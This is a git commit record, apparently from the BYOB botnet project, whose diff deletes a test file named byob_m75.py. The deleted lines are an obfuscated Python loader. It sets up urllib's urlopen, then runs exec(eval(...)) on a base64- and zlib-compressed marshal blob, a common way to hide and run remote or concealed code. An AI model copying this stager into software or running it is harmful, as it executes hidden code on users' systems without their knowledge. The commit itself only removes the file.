ceaf0ddb3275784fe08216a963e935a4a18b5e9d
malwaredllc <danielvegamyhre@gmail.com>
2020-03-25 08:37:42 -0600

    Removed test files.

--- byob/byob_m75.py
+++
@@ -1,5 +0,0 @@
-import sys,zlib,base64,marshal,json,urllib
-if sys.version_info[0] > 2:
-    from urllib import request
-urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
-exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrtmFgYCgtyskvSM3TUM8oKSmw0tc3NDfRMzHTM7S00DM0MbUyNDa20NcvLklMTy0q1s81N9UrqFTX1CtKTUzR0AQAS7MSEg==')))))
